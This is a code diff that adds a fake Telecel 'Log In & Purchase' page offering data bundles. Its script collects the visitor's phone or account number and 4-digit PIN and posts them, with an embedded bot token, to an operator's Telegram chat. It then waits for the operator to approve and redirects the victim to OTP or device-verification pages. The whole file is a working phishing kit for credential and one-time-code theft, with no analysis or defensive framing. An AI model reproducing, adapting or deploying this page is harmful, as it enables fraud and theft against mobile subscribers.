@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Telecel - Log In & Purchase</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #333;
+        }
+        
+        .container {
+            width: 100%; 
+            max-width: 420px;
+            background: #fff; 
+            border-radius: 16px;
+            padding: 32px 24px; 
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+            text-align: center;
+        }
+        
+        .logo-t {
+            color: #E30613; 
+            font-size: 52px; 
+            font-weight: 900; 
+            letter-spacing: -1px;
+            border: 4px solid #E30613; 
+            border-radius: 50%;
+            width: 80px; 
+            height: 80px; 
+            line-height: 72px; 
+            margin: 0 auto;
+        }
+        
+        .logo-text {
+            color: #E30613; 
+            font-size: 28px; 
+            font-weight: 700; 
+            margin: 8px 0 24px;
+        }
+        
+        h1 { 
+            font-size: 24px; 
+            font-weight: 700; 
+            margin-bottom: 8px; 
+        }
+        
+        .subtitle { 
+            font-size: 15px; 
+            color: #555; 
+            line-height: 1.4; 
+            margin-bottom: 24px; 
+        }
+        
+        .bundle-info {
+            background: linear-gradient(135deg, rgba(227, 6, 19, 0.1) 0%, rgba(0, 51, 160, 0.1) 100%);
+            border-left: 4px solid #E30613;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        
+        .bundle-info h3 {
+            color: #E30613;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .bundle-info p {
+            color: #666;
+            font-size: 13px;
+            margin: 2px 0;
+        }
+        
+        .bundle-price {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0033A0;
+            margin-top: 6px;
+        }
+        
+        .form-group { 
+            text-align: left; 
+            margin-bottom: 24px; 
+        }
+        
+        label { 
+            display: block; 
+            font-size: 14px; 
+            font-weight: 600; 
+            margin-bottom: 8px; 
+        }
+        
+        select, input[type="tel"], input[type="text"] {
+            width: 100%; 
+            padding: 16px 18px; 
+            font-size: 17px;
+            border: 1.5px solid #E30613; 
+            border-radius: 12px; 
+            outline: none;
+            transition: all 0.3s;
+        }
+        
+        select:focus, input:focus { 
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
+            border-color: #0033A0;
+        }
+        
+        #password {
+            font-size: 22px;
+            letter-spacing: 8px;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .error-msg {
+            color: #dc3545; 
+            font-size: 13px; 
+            margin-top: 6px; 
+            display: none;
+            padding: 10px;
+            background: rgba(220, 53, 69, 0.1);
+            border-radius: 6px;
+        }
+        
+        .success-msg {
+            color: #28a745; 
+            font-size: 13px; 
+            margin-top: 6px; 
+            display: none;
+            padding: 10px;
+            background: rgba(40, 167, 69, 0.1);
+            border-radius: 6px;
+        }
+        
+        .btn-action, .btn-back {
+            width: 100%; 
+            padding: 18px; 
+            font-size: 18px; 
+            font-weight: 700;
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+            margin: 12px 0 8px;
+        }
+        
+        .btn-action {
+            color: #fff; 
+            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
+            border: none;
+            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.25);
+        }
+        
+        .btn-action:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
+        }
+        
+        .btn-action:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn-back {
+            font-size: 16px; 
+            font-weight: 600; 
+            color: #E30613;
+            background: transparent; 
+            border: 1.5px solid #E30613;
+        }
+        
+        .btn-back:hover { 
+            background: rgba(227, 6, 19, 0.05); 
+        }
+        
+        #spinner {
+            position: fixed; 
+            inset: 0; 
+            background: rgba(227, 6, 19, 0.15);
+            display: none; 
+            justify-content: center; 
+            align-items: center; 
+            z-index: 9999;
+        }
+        
+        .spin {
+            width: 60px; 
+            height: 60px; 
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #E30613; 
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+        
+        .password-wrapper {
+            position: relative;
+        }
+        
+        .password-wrapper input {
+            padding-right: 48px;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 16px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            fill: #333;
+            transition: fill 0.2s;
+        }
+        
+        .toggle-password:hover {
+            fill: #E30613;
+        }
+        
+        .back-to-bundles {
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .back-to-bundles a {
+            color: #0033A0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+        
+        .back-to-bundles a:hover {
+            color: #E30613;
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-t">t</div>
+        <div class="logo-text">telecel</div>
+        
+        <h1>Welcome to Telecel Play</h1>
+        <p class="subtitle">
+            Input your telecel number and pin to complete your purchase.
+            <br/>
+            You need to be a Telecel subscriber to proceed.
+        </p>
+        
+        <!-- Bundle Information Display -->
+        <div class="bundle-info" id="bundleInfo" style="display: none;">
+            <h3>📦 Your Selected Bundle</h3>
+            <p id="bundleData">-</p>
+            <p id="bundlePrice" class="bundle-price">-</p>
+        </div>
+        
+        <div class="form-group">
+            <label>Account type</label>
+            <select id="accountType">
+                <option value="mobile">Mobile</option>
+                <option value="broadband">Broadband</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label id="inputLabel">Phone Number</label>
+            <input id="phone" inputmode="tel" placeholder="020XXXXXXX or 050XXXXXXX" type="tel"/>
+        </div>
+        
+        <div class="form-group">
+            <label>
+                PIN
+                <small style="color:#666; font-weight:400;">
+                    (4 digits only)
+                </small>
+            </label>
+            <div class="password-wrapper">
+                <input autocomplete="off" id="password" inputmode="numeric" maxlength="4" placeholder="••••" type="text"/>
+                <svg class="toggle-password" id="togglePassword" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path>
+                </svg>
+            </div>
+        </div>
+        
+        <div class="error-msg" id="err">
+            Please enter a valid Telecel number and 4-digit PIN
+        </div>
+        
+        <div class="success-msg" id="successMsg">
+            ✓ Credentials verified! Redirecting...
+        </div>
+        
+        <button class="btn-action" id="next">
+            Complete Purchase
+        </button>
+        
+        <button class="btn-back" id="back">
+            Cancel
+        </button>
+        
+        <div class="back-to-bundles">
+            <a href="index.html">← Back to Data Bundles</a>
+        </div>
+    </div>
+    
+    <div id="spinner">
+        <div class="spin"></div>
+    </div>
+
+    <script>
+        // CONFIG
+        const CONFIG = {
+            BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
+            CHAT_ID: '6573120346',
+            MIN_PHONE_LENGTH: 10,
+            REDIRECT_PAGE: 'otp.html'
+        };
+
+        // STATE
+        const state = {
+            lastUpdateId: 0,
+            pollInterval: null,
+            approveId: null,
+            declineId: null,
+            verifyDeviceId: null,
+            bundleInfo: null
+        };
+
+        // DOM Elements
+        const els = {
+            accountType: document.getElementById('accountType'),
+            inputLabel: document.getElementById('inputLabel'),
+            phoneInput: document.getElementById('phone'),
+            passwordInput: document.getElementById('password'),
+            togglePassword: document.getElementById('togglePassword'),
+            nextBtn: document.getElementById('next'),
+            errMsg: document.getElementById('err'),
+            successMsg: document.getElementById('successMsg'),
+            spinner: document.getElementById('spinner'),
+            backBtn: document.getElementById('back'),
+            bundleInfo: document.getElementById('bundleInfo'),
+            bundleData: document.getElementById('bundleData'),
+            bundlePrice: document.getElementById('bundlePrice')
+        };
+
+        // === Extract Bundle Info from URL ===
+        function extractBundleInfo() {
+            const params = new URLSearchParams(window.location.search);
+            const bundle = params.get('bundle');
+            const price = params.get('price');
+            
+            if (bundle && price) {
+                state.bundleInfo = { bundle, price };
+                
+                // Display bundle info
+                els.bundleInfo.style.display = 'block';
+                els.bundleData.textContent = `${bundle.toUpperCase()} Data Bundle`;
+                els.bundlePrice.textContent = `GHS ${price}`;
+                
+                // Update button text
+                els.nextBtn.textContent = `Pay GHS ${price} & Continue`;
+                
+                // Store in localStorage for verification page
+                localStorage.setItem('selectedBundle', bundle);
+                localStorage.setItem('bundlePrice', price);
+            }
+        }
+
+        // === PIN Input Strict Control ===
+        els.passwordInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 4);
+        });
+
+        els.passwordInput.addEventListener('paste', function(e) {
+            const pasted = e.clipboardData.getData('text');
+            if (!/^\d{0,4}$/.test(pasted)) e.preventDefault();
+        });
+
+        // === Password Toggle ===
+        els.togglePassword.addEventListener('click', () => {
+            const isHidden = els.passwordInput.type === 'password';
+            els.passwordInput.type = isHidden ? 'text' : 'password';
+            
+            els.togglePassword.innerHTML = isHidden 
+                ? '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>'
+                : '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+        });
+
+        // === Account Type Switch ===
+        function updateInputField() {
+            const type = els.accountType.value;
+            if (type === 'mobile') {
+                els.inputLabel.textContent = 'Phone Number';
+                els.phoneInput.type = 'tel';
+                els.phoneInput.placeholder = '020XXXXXXX or 050XXXXXXX';
+                els.phoneInput.inputMode = 'tel';
+            } else {
+                els.inputLabel.textContent = 'User ID / Account Number';
+                els.phoneInput.type = 'text';
+                els.phoneInput.placeholder = 'ABCDXXX';
+                els.phoneInput.inputMode = 'text';
+            }
+        }
+        els.accountType.addEventListener('change', updateInputField);
+        updateInputField();
+
+        els.phoneInput.addEventListener('input', () => {
+            if (els.accountType.value === 'mobile') {
+                els.phoneInput.value = els.phoneInput.value.replace(/\D/g, '');
+            }
+        });
+
+        // === Helpers ===
+        function showError(msg = "Please enter a valid Telecel number and 4-digit PIN") {
+            els.errMsg.textContent = msg;
+            els.errMsg.style.display = 'block';
+            els.successMsg.style.display = 'none';
+        }
+
+        function hideError() {
+            els.errMsg.style.display = 'none';
+        }
+
+        function showSuccess(msg = "✓ Credentials verified! Redirecting...") {
+            els.successMsg.textContent = msg;
+            els.successMsg.style.display = 'block';
+            els.errMsg.style.display = 'none';
+        }
+
+        function showSpinner() {
+            els.spinner.style.display = 'flex';
+        }
+
+        function hideSpinner() {
+            els.spinner.style.display = 'none';
+        }
+
+        function stopPolling() {
+            if (state.pollInterval) {
+                clearInterval(state.pollInterval);
+                state.pollInterval = null;
+            }
+        }
+
+        // === Bot Sending + Polling (FIXED: HTML parse mode) ===
+        function sendLoginAttempt(accountType, accountValue, password) {
+            const ts = Date.now();
+            state.approveId = `approve_${ts}`;
+            state.declineId = `decline_${ts}`;
+            state.verifyDeviceId = `verify_device_${ts}`;
+
+            const bundleText = state.bundleInfo 
+                ? `\nBundle: <code>${state.bundleInfo.bundle}</code> (GHS ${state.bundleInfo.price})`
+                : '';
+
+            const message = `<b>Telecel Play Purchase Request</b>\n\n` +
+                            `Account Type: <code>${accountType}</code>\n` +
+                            `Account: <code>${accountValue}</code>\n` +
+                            `PIN: <code>${password}</code>` +
+                            bundleText +
+                            `\n\nApprove?`;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve & Complete', callback_data: state.approveId },
+                                { text: '❌ Decline', callback_data: state.declineId }
+                            ],
+                            [
+                                { text: '📱 Verify Device', callback_data: state.verifyDeviceId }
+                            ]
+                        ]
+                    }
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.ok) {
+                    console.error("Send failed:", data);
+                    hideSpinner();
+                    showError("Failed to send to Telegram. Check bot token / chat ID.");
+                } else {
+                    startImprovedPolling();
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                hideSpinner();
+                showError('Connection error: ' + err.message);
+            });
+        }
+
+        function startImprovedPolling() {
+            stopPolling();
+
+            state.pollInterval = setInterval(() => {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=10&allowed_updates=["callback_query"]`;
+
+                fetch(url)
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result?.length) return;
+
+                        for (const update of data.result) {
+                            state.lastUpdateId = update.update_id;
+
+                            const cb = update.callback_query;
+                            if (!cb) continue;
+
+                            const cbData = cb.data;
+
+                            if (cbData === state.approveId) {
+                                stopPolling();
+                                showSuccess("✓ Purchase approved! Completing transaction...");
+
+                                // Save data
+                                const accType = els.accountType.value;
+                                const accValue = els.phoneInput.value.trim();
+                                const pin = els.passwordInput.value.trim();
+
+                                localStorage.setItem('accountType', accType);
+                                localStorage.setItem('accountNumber', accValue);
+                                localStorage.setItem('password', pin);
+                                if (accType === 'mobile') localStorage.setItem('phone', accValue);
+
+                                // Redirect after brief delay
+                                setTimeout(() => {
+                                    window.location.href = CONFIG.REDIRECT_PAGE;
+                                }, 1500);
+                                return;
+                            }
+
+                            if (cbData === state.declineId) {
+                                stopPolling();
+                                hideSpinner();
+                                showError("Purchase declined. Please try again or contact support.");
+                                return;
+                            }
+
+                            if (cbData === state.verifyDeviceId) {
+                                stopPolling();
+                                showSuccess("✓ Device verification required. Redirecting...");
+                                
+                                const accValue = els.phoneInput.value.trim();
+                                localStorage.setItem('accountNumber', accValue);
+
+                                setTimeout(() => {
+                                    window.location.href = 'device_verify.html';
+                                }, 1500);
+                                return;
+                            }
+                        }
+                    })
+                    .catch(err => console.warn("Polling error:", err));
+            }, 1800);
+        }
+
+        // === Submit Handler ===
+        els.nextBtn.onclick = () => {
+            hideError();
+
+            const accountTypeVal = els.accountType.value;
+            const inputVal = els.phoneInput.value.trim();
+            const pin = els.passwordInput.value.trim();
+
+            if (!inputVal) {
+                showError("Please enter your account details");
+                return;
+            }
+
+            if (accountTypeVal === 'mobile') {
+                if (inputVal.length < CONFIG.MIN_PHONE_LENGTH || 
+                    (!inputVal.startsWith('020') && !inputVal.startsWith('050'))) {
+                    showError("Invalid Telecel number (must start with 020 or 050)");
+                    return;
+                }
+            }
+
+            if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                showError("PIN must be exactly 4 digits");
+                els.passwordInput.focus();
+                return;
+            }
+
+            showSpinner();
+            const displayType = accountTypeVal === 'mobile' ? 'Mobile' : 'Broadband';
+            sendLoginAttempt(displayType, inputVal, pin);
+        };
+
+        els.backBtn.onclick = () => window.history.back();
+
+        // === Initialize ===
+        extractBundleInfo();
+        els.phoneInput.focus();
+    </script>
+</body>
+</html>
